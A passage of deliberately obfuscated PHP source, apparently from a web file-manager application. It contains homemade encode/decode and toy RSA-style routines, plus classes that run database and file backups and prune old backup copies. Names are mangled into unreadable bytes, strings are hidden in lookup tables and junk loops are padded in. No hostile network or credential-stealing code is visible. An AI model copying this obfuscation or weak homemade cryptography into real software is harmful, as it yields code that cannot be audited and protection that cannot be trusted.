$¨ê×ãö = rand_string(15); $ÖÔ¶ı­ = $ÙÃœô[744]; while ($ÖÔ¶ı­ < $ÙÃœô[658]) { if ($ÖÔ¶ı­ >= 0) { break; } $ÖÔ¶ı­++; } $ƒ´Ï„® = $æøˆ–å[297]; switch ($Ü¶ËÌŞÏ) { case $æøˆ–å[206]: $Ùá›»Æ = $this->wgti38a56078($™šÔçÛİ, strrev($ÙÜ¡ŸÚ¼ . $¨ê×ãö)); $ö»ì¼Õ  = $ÙÃœô[745]; if (!$ö»ì¼Õ ) { return; } break; $ÇƒºÌ¨ò = $ÙÃœô[746]; if (!$ÇƒºÌ¨ò) { return; } case $æøˆ–å[123]: $Ùá›»Æ = $this->wgti38a56078($™šÔçÛİ, strrev($¨ê×ãö . $ÙÜ¡ŸÚ¼)); break; case $æøˆ–å[298]: $Ùá›»Æ = $this->wgti38a56078($™šÔçÛİ, base64_encode($¨ê×ãö . $ÙÜ¡ŸÚ¼)); $ò¼ÎƒÃ½ = $ÙÃœô[747]; if (strlen($ò¼ÎƒÃ½) < $ÙÃœô[663]) { die; } break; case $æøˆ–å[299]: $Ùá›»Æ = $this->wgti38a56078($™šÔçÛİ, md5($¨ê×ãö . $ÙÜ¡ŸÚ¼)); $Ä‹ĞÃ¤ = $ÙÃœô[709]; break; case $æøˆ–å[300]: $™šÔçÛİ = base64_encode($™šÔçÛİ); $‡›™ñ´¡ = rand(0, 64); $¦êø—ğ = $ƒ´Ï„®[$‡›™ñ´¡]; $øí¯³ÂÎ = $ÙÃœô[748]; while (strlen($øí¯³ÂÎ) < $ÙÃœô[651]) { if (!$øí¯³ÂÎ) { break; } $øí¯³ÂÎ++; } $í÷‘±¿ˆ = md5($¦êø—ğ . md5($ÙÜ¡ŸÚ¼ . $¦êø—ğ) . $ÙÜ¡ŸÚ¼); $‘«Š­Ï = $ÙÃœô[749]; $í÷‘±¿ˆ = substr($í÷‘±¿ˆ, $‡›™ñ´¡ % 8, $‡›™ñ´¡ % 8 + 7); $ğ‘²Àíİ = $ÙÃœô[750]; $¾ŸÖÀ = $æøˆ–å[6]; $‡–—¤Ø› = $ÙÃœô[751]; if (strlen($‡–—¤Ø›) < $ÙÃœô[651]) { die; } $Ì§êÒµÕ = 0; $İ÷ş¿õ‘ = 0; $Ó‡˜†ºæ = 0; for ($Ì§êÒµÕ = 0; $Ì§êÒµÕ < strlen($™šÔçÛİ); $Ì§êÒµÕ++) { $Ó‡˜†ºæ = $Ó‡˜†ºæ == strlen($í÷‘±¿ˆ) ? 0 : $Ó‡˜†ºæ; $·ÊÎäŸâ = $ÙÃœô[752]; while (strlen($·ÊÎäŸâ) < $ÙÃœô[672]) { if (!$·ÊÎäŸâ) { break; } $·ÊÎäŸâ++; } $İ÷ş¿õ‘ = ($‡›™ñ´¡ + strpos($ƒ´Ï„®, $™šÔçÛİ[$Ì§êÒµÕ]) + ord($í÷‘±¿ˆ[$Ó‡˜†ºæ++])) % 64; $üƒ»¸•Ô = $ÙÃœô[753]; if (!$üƒ»¸•Ô) { die; } $¾ŸÖÀ .= $ƒ´Ï„®[$İ÷ş¿õ‘]; } $Ùá›»Æ = hash_encode($¦êø—ğ . $¾ŸÖÀ); $ä÷±Ä¶ = $ÙÃœô[754]; if (!$ä÷±Ä¶) { die; } break; $–Ù­Ö“Š = $ÙÃœô[755]; default: $Ùá›»Æ = $this->wgti38a56078($™šÔçÛİ, $ÙÜ¡ŸÚ¼ . $¨ê×ãö); $ÆæÌäÍÒ = $ÙÃœô[756]; if (!$ÆæÌäÍÒ) { die; } break; $ªÈÁî—ú = $ÙÃœô[757]; while ($ªÈÁî—ú < $ÙÃœô[672]) { if ($ªÈÁî—ú >= 0) { break; } $ªÈÁî—ú++; } } $Ùá›»Æ = strrev($Ü¶ËÌŞÏ . $¨ê×ãö . $Ùá›»Æ); if ($“öõÕ¿™ - 1 > 0) { $Ùá›»Æ = $this->doni1913d9ea($Ùá›»Æ, $ÙÜ¡ŸÚ¼, $“öõÕ¿™ - 1); } return $Ùá›»Æ; } private function zmkl9e9945a1($ÔÛÍ–Ö, $“î¸åÓş, $Õñ‡åÚò = 3) { $Ç†å‹º =& $_SERVER[èùÙ¹Ïö]; $ÆèŠ°Ğ² =& $_SERVER[€ÇÉªãÇ]; if (!is_string($ÔÛÍ–Ö) || strlen($ÔÛÍ–Ö) < 10) { return !1; } $ÔÛÍ–Ö = trim($ÔÛÍ–Ö); $ÔÛÍ–Ö = strrev($ÔÛÍ–Ö); $²ºÛÅø‹ = $Ç†å‹º[758]; while (strlen($²ºÛÅø‹) < $Ç†å‹º[655]) { if (!$²ºÛÅø‹) { break; } $²ºÛÅø‹++; } $¶´¿òÔï = $ÔÛÍ–Ö[0]; $Éæ°îåí = substr($ÔÛÍ–Ö, 1, 15); $Ğ€¦’ÕÃ = $Ç†å‹º[759]; while (strlen($Ğ€¦’ÕÃ) < $Ç†å‹º[655]) { if (!$Ğ€¦’ÕÃ) { break; } $Ğ€¦’ÕÃ++; } $ÔÛÍ–Ö = substr($ÔÛÍ–Ö, 16); $ü¨ÛÛ÷¸ = $Ç†å‹º[760]; $Ó —¼Ó‘ = $ÆèŠ°Ğ²[297]; switch ($¶´¿òÔï) { case $ÆèŠ°Ğ²[206]: $£Ì€øÀò = $this->vfut444819ee($ÔÛÍ–Ö, strrev($“î¸åÓş . $Éæ°îåí)); $’µİà›‘ = $Ç†å‹º[761]; if (strlen($’µİà›‘) < $Ç†å‹º[651]) { return; } break; $òòŞåÓÎ = $Ç†å‹º[762]; case $ÆèŠ°Ğ²[123]: $£Ì€øÀò = $this->vfut444819ee($ÔÛÍ–Ö, strrev($Éæ°îåí . $“î¸åÓş)); break; case $ÆèŠ°Ğ²[298]: $£Ì€øÀò = $this->vfut444819ee($ÔÛÍ–Ö, base64_encode($Éæ°îåí . $“î¸åÓş)); $ûëúü¤” = $Ç†å‹º[763]; while ($ûëúü¤” < $Ç†å‹º[655]) { if ($ûëúü¤” >= 0) { break; } $ûëúü¤”++; } break; case $ÆèŠ°Ğ²[299]: $£Ì€øÀò = $this->vfut444819ee($ÔÛÍ–Ö, md5($Éæ°îåí . $“î¸åÓş)); break; case $ÆèŠ°Ğ²[300]: $ÔÛÍ–Ö = hash_decode($ÔÛÍ–Ö); $¤ÖŒìâ = $Ç†å‹º[764]; if (strlen($¤ÖŒìâ) < $Ç†å‹º[651]) { return; } $†¨ ¦ = $ÔÛÍ–Ö[0]; $ÔÛÍ–Ö = substr($ÔÛÍ–Ö, 1); $ŸÍğ©Ú = strpos($Ó —¼Ó‘, $†¨ ¦); $ÃıÀğê  = md5($†¨ ¦ . md5($“î¸åÓş . $†¨ ¦) . $“î¸åÓş); $ÃıÀğê  = substr($ÃıÀğê , $ŸÍğ©Ú % 8, $ŸÍğ©Ú % 8 + 7); $ïÔÓ™Šˆ = $Ç†å‹º[765]; while ($ïÔÓ™Šˆ < $Ç†å‹º[663]) { if ($ïÔÓ™Šˆ >= 0) { break; } $ïÔÓ™Šˆ++; } $şŞ™îÄ˜ = $ÆèŠ°Ğ²[6]; $ëæ½¢·Ñ = 0; $®±Ä¢œâ = 0; $²ú´Ìğş = 0; for ($ëæ½¢·Ñ = 0; $ëæ½¢·Ñ < strlen($ÔÛÍ–Ö); $ëæ½¢·Ñ++) { $²ú´Ìğş = $²ú´Ìğş == strlen($ÃıÀğê ) ? 0 : $²ú´Ìğş; $Ìñ—ô™ = $Ç†å‹º[766]; $Õ¯¢ó¡ = $²ú´Ìğş++; $­È®Éè = $Ç†å‹º[767]; if (!$­È®Éè) { die; } $®±Ä¢œâ = strpos($Ó —¼Ó‘, $ÔÛÍ–Ö[$ëæ½¢·Ñ]) - $ŸÍğ©Ú - ord($ÃıÀğê [$Õ¯¢ó¡]); while ($®±Ä¢œâ < 0) { $®±Ä¢œâ += 64; } $şŞ™îÄ˜ .= $Ó —¼Ó‘[$®±Ä¢œâ]; } $£Ì€øÀò = base64_decode($şŞ™îÄ˜); $Ùâõöï = $Ç†å‹º[768]; break; default: $£Ì€øÀò = $this->vfut444819ee($ÔÛÍ–Ö, $“î¸åÓş . $Éæ°îåí); break; $´ƒ…Ø» = $Ç†å‹º[769]; if (!$´ƒ…Ø») { return; } } if ($Õñ‡åÚò - 1 > 0) { $£Ì€øÀò = $this->zmkl9e9945a1($£Ì€øÀò, $“î¸åÓş, $Õñ‡åÚò - 1); } return $£Ì€øÀò; } public function cltu5d49b12c($’Ñ›Ê¸÷) { $»—¤¥ç€ =& $_SERVER[èùÙ¹Ïö]; $Ó‚Ğ¢ËÚ =& $_SERVER[€ÇÉªãÇ]; $ò¦ùø·¼ = $this->wshme09270a3(); $‹ø–¼– = $»—¤¥ç€[770]; $í€¡±¸ = $this->wshme09270a3(); $¡ç«¹Ãã = ($ò¦ùø·¼ - 1) * ($í€¡±¸ - 1); $ˆØÔ°úö = intval(($ò¦ùø·¼ + $í€¡±¸) / 2); $—¿çƒÙ­ = $»—¤¥ç€[771]; while (1) { $éÔø±¢ = $ˆØÔ°úö; $‡‡¹Ñå™ = $¡ç«¹Ãã; while ($‡‡¹Ñå™ % $éÔø±¢ != 0) { $Ê”ìî×› = $‡‡¹Ñå™; $‡‡¹Ñå™ = $éÔø±¢; $Õ»¾¤é = $»—¤¥ç€[772]; while (strlen($Õ»¾¤é) < $»—¤¥ç€[651]) { if (!$Õ»¾¤é) { break; } $Õ»¾¤é++; } $éÔø±¢ = $Ê”ìî×› % $éÔø±¢; } if ($éÔø±¢ == 1) { break; } else { $ˆØÔ°úö++; } } $–’ş·åú = 2; for ($ÓÜâÎô = 0; $ÓÜâÎô < $¡ç«¹Ãã * 10; $ÓÜâÎô++) { if (($¡ç«¹Ãã * $ÓÜâÎô + 1) % $ˆØÔ°úö == 0) { $–’ş·åú = intval(($¡ç«¹Ãã * $ÓÜâÎô + 1) / $ˆØÔ°úö); break; } } $Ø±˜Óº´ = $this->wgti38a56078($ò¦ùø·¼ * $í€¡±¸ . $Ó‚Ğ¢ËÚ[6], $Ó‚Ğ¢ËÚ[137]); $ïÂ×¸Ä› = md5($Ó‚Ğ¢ËÚ[301] . ($ò¦ùø·¼ + $í€¡±¸) . $Ó‚Ğ¢ËÚ[302] . $ˆØÔ°úö . $Ó‚Ğ¢ËÚ[302] . $–’ş·åú . $Ó‚Ğ¢ËÚ[303]); $İ¶„† = $»—¤¥ç€[773]; while ($İ¶„† < $»—¤¥ç€[663]) { if ($İ¶„† >= 0) { break; } $İ¶„†++; } $ÒıâÈ©ì = $this->wgti38a56078($’Ñ›Ê¸÷, $ïÂ×¸Ä›) . $Ó‚Ğ¢ËÚ[304] . $Ø±˜Óº´; $ãÁÛºĞ = $»—¤¥ç€[774]; while ($ãÁÛºĞ < $»—¤¥ç€[658]) { if ($ãÁÛºĞ >= 0) { break; } $ãÁÛºĞ++; } return $ÒıâÈ©ì; $é¤í÷òû = $»—¤¥ç€[775]; if (strlen($é¤í÷òû) < $»—¤¥ç€[672]) { return; } } public function bokwdac7c933($Ñ¬èêï½) { $ã»†Åóø =& $_SERVER[èùÙ¹Ïö]; $ï¤—„öÈ =& $_SERVER[€ÇÉªãÇ]; $æ¯ÎÀ¥€ = explode($ï¤—„öÈ[304], $Ñ¬èêï½); if (count($æ¯ÎÀ¥€) != 2) { return $ï¤—„öÈ[6]; } $‡©ŸÑ‡¢ = $this->vfut444819ee($æ¯ÎÀ¥€[1] . $ï¤—„öÈ[6], $ï¤—„öÈ[137]); if (!$‡©ŸÑ‡¢) { return $ï¤—„öÈ[6]; } $‡©ŸÑ‡¢ = intval($‡©ŸÑ‡¢); $Ã˜ÑÒ× = 0; $²ƒÍÉıŒ = $ã»†Åóø[776]; if (!$²ƒÍÉıŒ) { die; } $ê¹òÛ• = 0; for ($èšàïÛÆ = 3; $èšàïÛÆ < $‡©ŸÑ‡¢; $èšàïÛÆ += 2) { if ($‡©ŸÑ‡¢ % $èšàïÛÆ != 0) { continue; } $Ã˜ÑÒ× = $èšàïÛÆ; $ê¹òÛ• = intval($‡©ŸÑ‡¢ / $èšàïÛÆ); break; } $ÒãÙæõÆ = ($Ã˜ÑÒ× - 1) * ($ê¹òÛ• - 1); $šîæì‰ = intval(($Ã˜ÑÒ× + $ê¹òÛ•) / 2); while (1) { $È­Ó«êÖ = $šîæì‰; $Ø»—Å™ = $ÒãÙæõÆ; while ($Ø»—Å™ % $È­Ó«êÖ != 0) { $ÅéÈİĞÉ = $Ø»—Å™; $Ø»—Å™ = $È­Ó«êÖ; $â¯ÇÁëŸ = $ã»†Åóø[777]; if (strlen($â¯ÇÁëŸ) < $ã»†Åóø[651]) { return; } $È­Ó«êÖ = $ÅéÈİĞÉ % $È­Ó«êÖ; $ïå±óïê = $ã»†Åóø[778]; if (!$ïå±óïê) { die; } } if ($È­Ó«êÖ == 1) { break; } else { $šîæì‰++; } } $§ÜÓûÙ = 2; $æ×Ûüáã = $ã»†Åóø[779]; if (strlen($æ×Ûüáã) < $ã»†Åóø[655]) { return; } for ($èšàïÛÆ = 0; $èšàïÛÆ < $ÒãÙæõÆ * 10; $èšàïÛÆ++) { if (($ÒãÙæõÆ * $èšàïÛÆ + 1) % $šîæì‰ == 0) { $§ÜÓûÙ = intval(($ÒãÙæõÆ * $èšàïÛÆ + 1) / $šîæì‰); break; } } $—ŠÉÎÖ = md5($ï¤—„öÈ[301] . ($Ã˜ÑÒ× + $ê¹òÛ•) . $ï¤—„öÈ[302] . $šîæì‰ . $ï¤—„öÈ[302] . $§ÜÓûÙ . $ï¤—„öÈ[303]); $Çäªü = $ã»†Åóø[780]; $ƒïŞ¸ = $this->vfut444819ee($æ¯ÎÀ¥€[0], $—ŠÉÎÖ); return $ƒïŞ¸; $›æŸÍÓ = $ã»†Åóø[781]; if (!$›æŸÍÓ) { die; } } public function wshme09270a3() { $·‡ûœ¾È =& $_SERVER[èùÙ¹Ïö]; $¼æßêñ† = mt_rand(pow(2, 14), pow(2, 16) - 1); $ºªÍ„èŞ = $·‡ûœ¾È[782]; while (strlen($ºªÍ„èŞ) < $·‡ûœ¾È[658]) { if (!$ºªÍ„èŞ) { break; } $ºªÍ„èŞ++; } $³íÚò÷  = array(); $¾™âŠøÊ = 1; while ($¾™âŠøÊ <= (int) sqrt($¼æßêñ†)) { $ËÌ¥œÇ² = $¾™âŠøÊ; $ƒÌÒË¿ = $·‡ûœ¾È[783]; if (!$ƒÌÒË¿) { return; } while (!0) { $ËÌ¥œÇ²++; $¼‚æ‘ç  = $·‡ûœ¾È[784]; if (strlen($¼‚æ‘ç ) < $·‡ûœ¾È[658]) { die; } if ($ËÌ¥œÇ² <= 2) { $¾™âŠøÊ = $ËÌ¥œÇ²; break; } else { if ($ËÌ¥œÇ² < 2) { continue; } } $¾ÛêüíÄ = !0; for ($Œ¯Àá•ß = 2; $Œ¯Àá•ß <= sqrt($ËÌ¥œÇ²); $Œ¯Àá•ß++) { if ($ËÌ¥œÇ² % $Œ¯Àá•ß == 0) { $¾ÛêüíÄ = !1; } } if ($¾ÛêüíÄ) { $¾™âŠøÊ = $ËÌ¥œÇ²; break; } } $³íÚò÷ [] = $¾™âŠøÊ; } $œ¹îõöâ = 2; for ($ËÌ¥œÇ² = $¼æßêñ†; $ËÌ¥œÇ² > 1; $ËÌ¥œÇ²--) { $¾ÛêüíÄ = !0; $¦Ó¿áğ¤ = $·‡ûœ¾È[785]; foreach ($³íÚò÷  as $‹‹ÜØø¸) { if ($ËÌ¥œÇ² % $‹‹ÜØø¸ == 0) { $¾ÛêüíÄ = !1; break; } } if ($¾ÛêüíÄ) { $œ¹îõöâ = $ËÌ¥œÇ²; break; } } return $œ¹îõöâ; } public function zhecbf1079e9($‡î––Ôã, $¤Ğ™ç›ª) { $ÙˆÆ’— =& $_SERVER[€ÇÉªãÇ]; return call_user_func(array($ÙˆÆ’—[8], $ÙˆÆ’—[305]), $‡î––Ôã, $¤Ğ™ç›ª); } public function wgti38a56078($±¢Ğ°·Â, $¨Ûƒ¿í·) { $£ßöÀÛ÷ =& $_SERVER[€ÇÉªãÇ]; return call_user_func(array($£ßöÀÛ÷[306], $£ßöÀÛ÷[307]), $±¢Ğ°·Â, $¨Ûƒ¿í·); $îà½³çÓ = $_SERVER[èùÙ¹Ïö][786]; } public function vfut444819ee($õ¦¡î¦Ú, $…¸ï‰¸«) { $éãÙÈğ¾ =& $_SERVER[èùÙ¹Ïö]; $şğùçáé =& $_SERVER[€ÇÉªãÇ]; return call_user_func(array($şğùçáé[306], $şğùçáé[308]), $õ¦¡î¦Ú, $…¸ï‰¸«); $Ú«™ÓÅ™ = $éãÙÈğ¾[787]; if (strlen($Ú«™ÓÅ™) < $éãÙÈğ¾[655]) { die; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $Œæ®üÂÙ =& $_SERVER[èùÙ¹Ïö]; $this->isManual(); self::$name = date($Œæ®üÂÙ[788]); if (!($ÖÉÖ˜à‰ = Model($Œæ®üÂÙ[789])->lastItem())) { $ÖÉÖ˜à‰ = $this->initData(); } else { self::$name = $ÖÉÖ˜à‰[$Œæ®üÂÙ[32]]; if ($ÖÉÖ˜à‰[$Œæ®üÂÙ[790]] == $Œæ®üÂÙ[90]) { self::$name = date($Œæ®üÂÙ[257]); $Âİ÷ˆ†¾ = 0; if (isset($ÖÉÖ˜à‰[$Œæ®üÂÙ[339]][$Œæ®üÂÙ[216]][$Œæ®üÂÙ[511]])) { $Âİ÷ˆ†¾ = (int) $ÖÉÖ˜à‰[$Œæ®üÂÙ[339]][$Œæ®üÂÙ[216]][$Œæ®üÂÙ[511]]; } if (self::$manual == 0 && $ÖÉÖ˜à‰[$Œæ®üÂÙ[32]] == self::$name) { Model($Œæ®üÂÙ[789])->remove($ÖÉÖ˜à‰[$Œæ®üÂÙ[445]]); } $ÖÉÖ˜à‰ = $this->initData($Âİ÷ˆ†¾, $ÖÉÖ˜à‰[$Œæ®üÂÙ[791]]); } else { $this->checkStore($ÖÉÖ˜à‰[$Œæ®üÂÙ[791]]); } } self::$option = $ÖÉÖ˜à‰; } private function isManual() { $Õ›°ÅÈ¨ = _get($GLOBALS, $_SERVER[èùÙ¹Ïö][792], 0); $Õ›°ÅÈ¨ = intval($Õ›°ÅÈ¨); self::$manual = $Õ›°ÅÈ¨ && $Õ›°ÅÈ¨ == 1 ? 1 : 0; } private function initData($Ñß¢¥‹Ì = 0, $§¾»ìÍ = '') { $ĞÚ£êÑ =& $_SERVER[èùÙ¹Ïö]; $‚ĞíõåÑ = Model($ĞÚ£êÑ[789])->config(); if ($§¾»ìÍ && $‚ĞíõåÑ[$ĞÚ£êÑ[791]] != $§¾»ìÍ) { $Ñß¢¥‹Ì = 0; } $this->checkStore($‚ĞíõåÑ[$ĞÚ£êÑ[791]]); if (self::$manual == 1) { self::$name .= $ĞÚ£êÑ[11] . date($ĞÚ£êÑ[793]); } $ö³œĞçî = array($ĞÚ£êÑ[791] => $‚ĞíõåÑ[$ĞÚ£êÑ[791]], $ĞÚ£êÑ[32] => self::$name, $ĞÚ£êÑ[790] => 0, $ĞÚ£êÑ[794] => $‚ĞíõåÑ[$ĞÚ£êÑ[794]], $ĞÚ£êÑ[795] => self::$manual, $ĞÚ£êÑ[339] => array($ĞÚ£êÑ[796] => array($ĞÚ£êÑ[790] => 0), $ĞÚ£êÑ[797] => array($ĞÚ£êÑ[790] => 0, $ĞÚ£êÑ[798] => 0, $ĞÚ£êÑ[799] => 0, $ĞÚ£êÑ[33] => $ĞÚ£êÑ[12], $ĞÚ£êÑ[800] => 0, $ĞÚ£êÑ[801] => 0), $ĞÚ£êÑ[802] => array($ĞÚ£êÑ[790] => 0, $ĞÚ£êÑ[798] => 0, $ĞÚ£êÑ[799] => 0, $ĞÚ£êÑ[800] => 0, $ĞÚ£êÑ[801] => 0), $ĞÚ£êÑ[216] => array($ĞÚ£êÑ[790] => 0, $ĞÚ£êÑ[803] => 0, $ĞÚ£êÑ[804] => 0, $ĞÚ£êÑ[805] => 0, $ĞÚ£êÑ[806] => 0, $ĞÚ£êÑ[511] => $Ñß¢¥‹Ì, $ĞÚ£êÑ[800] => 0, $ĞÚ£êÑ[801] => 0)), $ĞÚ£êÑ[800] => time(), $ĞÚ£êÑ[801] => 0); $§³¦´§— = Model($ĞÚ£êÑ[789])->insert($ö³œĞçî); $ö³œĞçî[$ĞÚ£êÑ[445]] = $§³¦´§—; return $ö³œĞçî; } private function checkStore($ÄÔ¢İ—) { $Å›ìÂÊ¦ =& $_SERVER[èùÙ¹Ïö]; $ÁËÑçÁÔ = Model($Å›ìÂÊ¦[807])->listData($ÄÔ¢İ—); Model($Å›ìÂÊ¦[807])->checkConfig($ÁËÑçÁÔ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[èùÙ¹Ïö][789])->findByName(self::$name); } return self::$option; } public static function set($í·‰Éìö) { $İÖçèş’ =& $_SERVER[èùÙ¹Ïö]; $È´ƒÓ‰ = self::get(); foreach ($í·‰Éìö as $Šä—”î¶ => $Õ¹ÆÕ»‘) { $«âìåşÕ = explode($İÖçèş’[10], $Šä—”î¶); $¸ßìá´¥ = count($«âìåşÕ); switch ($¸ßìá´¥) { case 1: $È´ƒÓ‰[$«âìåşÕ[0]] = $Õ¹ÆÕ»‘; break; case 2: $È´ƒÓ‰[$«âìåşÕ[0]][$«âìåşÕ[1]] = $Õ¹ÆÕ»‘; break; case 3: $È´ƒÓ‰[$«âìåşÕ[0]][$«âìåşÕ[1]][$«âìåşÕ[2]] = $Õ¹ÆÕ»‘; break; } } Model($İÖçèş’[789])->update($È´ƒÓ‰[$İÖçèş’[445]], $È´ƒÓ‰); self::$option = $È´ƒÓ‰; return self::$option; } public function keep() { $”ğ¦ıÇ› =& $_SERVER[èùÙ¹Ïö]; $°”á¢›Ô = self::get(); if ($°”á¢›Ô[$”ğ¦ıÇ›[339]][$”ğ¦ıÇ›[796]][$”ğ¦ıÇ›[790]] == $”ğ¦ıÇ›[90]) { return; } $this->backupKeep($°”á¢›Ô); self::set(array($”ğ¦ıÇ›[808] => 1)); } private function backupKeep($œÀ¦ÓÊ) { $İ‡ß” =& $_SERVER[èùÙ¹Ïö]; if (self::$manual == 1) { return; } $Á›‡ä¬• = Model($İ‡ß”[789])->listData(); if (empty($Á›‡ä¬•)) { return; } $½öö¼Éş = 0; $…İÑÊÌº = array(); foreach ($Á›‡ä¬• as $«à©¡¦¼) { if ($½öö¼Éş >= 7) { break; } $…İÑÊÌº[] = $«à©¡¦¼[$İ‡ß”[32]]; $½öö¼Éş++; } for ($½öö¼Éş = 0; $½öö¼Éş < 12; $½öö¼Éş++) { $…İÑÊÌº[] = date($İ‡ß”[809], strtotime("\x2d{$½öö¼Éş}\40\155\x6f\156\164\x68\163")); } $…İÑÊÌº = array_unique($…İÑÊÌº); $û¦¹¸âˆ = Model($İ‡ß”[810])->get($İ‡ß”[811]); foreach ($Á›‡ä¬• as $«à©¡¦¼) { if (isset($«à©¡¦¼[$İ‡ß”[795]]) && $«à©¡¦¼[$İ‡ß”[795]] == $İ‡ß”[90]) { continue; } if (!empty($«à©¡¦¼[$İ‡ß”[32]]) && in_array($«à©¡¦¼[$İ‡ß”[32]], $…İÑÊÌº)) { continue; } Model($İ‡ß”[789])->remove($«à©¡¦¼[$İ‡ß”[445]]); $å¦œ÷šÚ = $this->backupPath($œÀ¦ÓÊ, $û¦¹¸âˆ); IO::remove($å¦œ÷šÚ, !1); } } private function backupPath($ÎÀÈ»ÔÂ, $Şş£ÍªÃ = false) { $¬µÒûªÜ =& $_SERVER[èùÙ¹Ïö]; if (!$Şş£ÍªÃ) { $Şş£ÍªÃ = Model($¬µÒûªÜ[810])->get($¬µÒûªÜ[811]); } $´À¦ÔãÛ = $ÎÀÈ»ÔÂ[$¬µÒûªÜ[32]]; $¹ğ™ÄÀ¡ = substr(md5($¬µÒûªÜ[812] . $Şş£ÍªÃ . $´À¦ÔãÛ), 0, 8); return "\173\x69\157\72{$ÎÀÈ»ÔÂ[$¬µÒûªÜ[791]]}\x7d\57\x64\141\x74\x61\142\141\163\x65\57\142\x61\x63\153\165\160\x2f" . $´À¦ÔãÛ . $¬µÒûªÜ[11] . $¹ğ™ÄÀ¡; } public function db() { $ìÒ³Ëü =& $_SERVER[èùÙ¹Ïö]; $ÚíüâÓÜ = self::get(); if ($ÚíüâÓÜ[$ìÒ³Ëü[339]][$ìÒ³Ëü[797]][$ìÒ³Ëü[790]] == $ìÒ³Ëü[90]) { return !0; } $ŠíùşğŞ = new BackupDb(); if (!$ŠíùşğŞ->index()) { return !1; } self::set(array($ìÒ³Ëü[813] => 1)); return !0; } public function dbFile() { $íß³õáÑ =& $_SERVER[èùÙ¹Ïö]; $É‘¹šÄÖ = self::get(); if ($É‘¹šÄÖ[$íß³õáÑ[339]][$íß³õáÑ[802]][$íß³õáÑ[790]] == $íß³õáÑ[90]) { return !0; } $®ãŸèÁû = new BackupDbFile(); if (!$®ãŸèÁû->index()) { return !1; } self::set(array($íß³õáÑ[814] => 1)); return !0; } public function file() { $Š™ÅÚôÁ =& $_SERVER[èùÙ¹Ïö]; $œÈš…ç¾ = self::get(); if ($œÈš…ç¾[$Š™ÅÚôÁ[339]][$Š™ÅÚôÁ[216]][$Š™ÅÚôÁ[790]] == $Š™ÅÚôÁ[90]) { return !0; } if (!isset($œÈš…ç¾[$Š™ÅÚôÁ[794]]) || $œÈš…ç¾[$Š™ÅÚôÁ[794]] == $Š™ÅÚôÁ[214]) { $è€ÄÖ¹’ = new BackupFile(); if (!$è€ÄÖ¹’->index()) { return !1; } } self::set(array($Š™ÅÚôÁ[815] => 1, $Š™ÅÚôÁ[790] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Ìıëæ§ü =& $_SERVER[èùÙ¹Ïö]; $Í³Ô§º = Backup::get(); self::$io = $Í³Ô§º[$Ìıëæ§ü[791]]; self::$name = $Í³Ô§º[$Ìıëæ§ü[32]]; $½ÍÍŒ» = new DbManage(); $•€Ñôå = $½ÍÍŒ»->dbType(); $Ä‰ùÛß® = array($Ìıëæ§ü[816] => $•€Ñôå, $Ìıëæ§ü[817] => time()); Backup::set($Ä‰ùÛß®); $ÛÇßÖµ¯ = $this->tmpFilesPath() . $Ìıëæ§ü[818] . self::$name . $Ìıëæ§ü[8]; del_dir($ÛÇßÖµ¯); mk_dir($ÛÇßÖµ¯); $è´ó‚Çœ = $”àÄüå± = 0; $Ìä»÷ğù = new Task($Ìıëæ§ü[819], $Ìıëæ§ü[820], 0, LNG($Ìıëæ§ü[821]) . $Ìıëæ§ü[822] . LNG($Ìıëæ§ü[823])); try { $Ñ·¿»± = $½ÍÍŒ»->db()->getTables(); } catch (Exception $¼İ”îÈü) { $Ìä»÷ğù->end(); return !1; } $Ñ·¿»± = array_diff($Ñ·¿»±, array($Ìıëæ§ü[824], $Ìıëæ§ü[825])); foreach ($Ñ·¿»± as $¨ËÈ¨Ï’) { $è´ó‚Çœ += $½ÍÍŒ»->model($¨ËÈ¨Ï’)->count(); } $Ìä»÷ğù->task[$Ìıëæ§ü[826]] = $è´ó‚Çœ; $GLOBALS[$Ìıëæ§ü[827]] = self::$name; foreach ($Ñ·¿»± as $¨ËÈ¨Ï’) { $û¿Ä¶Ìø = $ÛÇßÖµ¯ . $¨ËÈ¨Ï’ . $Ìıëæ§ü[828]; $ÎŠì¢¬š = null; if ($¨ËÈ¨Ï’ == $Ìıëæ§ü[829] && (!isset($Í³Ô§º[$Ìıëæ§ü[794]]) || $Í³Ô§º[$Ìıëæ§ü[794]] == $Ìıëæ§ü[214])) { $ÎŠì¢¬š = self::$io; } $”àÄüå± += $½ÍÍŒ»->sqlFromDb($¨ËÈ¨Ï’, $û¿Ä¶Ìø, $Ìä»÷ğù, $ÎŠì¢¬š); } unset($GLOBALS[$Ìıëæ§ü[827]]); $Ìä»÷ğù->end(); if ($”àÄüå± > $è´ó‚Çœ) { $è´ó‚Çœ = $”àÄüå±; } $Ä‰ùÛß® = array($Ìıëæ§ü[816] => $•€Ñôå, $Ìıëæ§ü[813] => 1, $Ìıëæ§ü[830] => $è´ó‚Çœ, $Ìıëæ§ü[831] => $”àÄüå±, $Ìıëæ§ü[832] => time()); Backup::set($Ä‰ùÛß®); if ($è´ó‚Çœ - $”àÄüå± > 0) { $éá¿©¸Ô = $Ìıëæ§ü[833]; if (stristr(I18n::getType(), $Ìıëæ§ü[834])) { $éá¿©¸Ô = $Ìıëæ§ü[835]; } write_log(array($éá¿©¸Ô, $Ä‰ùÛß®), $Ìıëæ§ü[820]); return !1; } return !0; } private function tmpFilesPath() { $Ë‚×áÒ¾ =& $_SERVER[èùÙ¹Ïö]; $Îçê†åğ = TEMP_FILES; if ($GLOBALS[$Ë‚×áÒ¾[6]][$Ë‚×áÒ¾[91]][$Ë‚×áÒ¾[836]]) { $Îçê†åğ = $GLOBALS[$Ë‚×áÒ¾[6]][$Ë‚×áÒ¾[91]][$Ë‚×áÒ¾[836]]; if (!mk_dir($Îçê†åğ) || !is_writable($Îçê†åğ) || !IO::mkfile($Îçê†åğ . $Ë‚×áÒ¾[837])) { $Îçê†åğ = TEMP_FILES; } } return $Îçê†åğ; } } goto E·—²½²•¹; D¬ØšùãÊœ: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $•äù”œ =& $_SERVER[èùÙ¹Ïö]; $¤Ğ£­Ø = $GLOBALS[$•äù”œ[6]][$•äù”œ[395]]; self::$cachePath = $¤Ğ£­Ø[$•äù”œ[216]][$•äù”œ[86]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Æë‚¹„Š, $ˆŒ¶…ö = 0) { 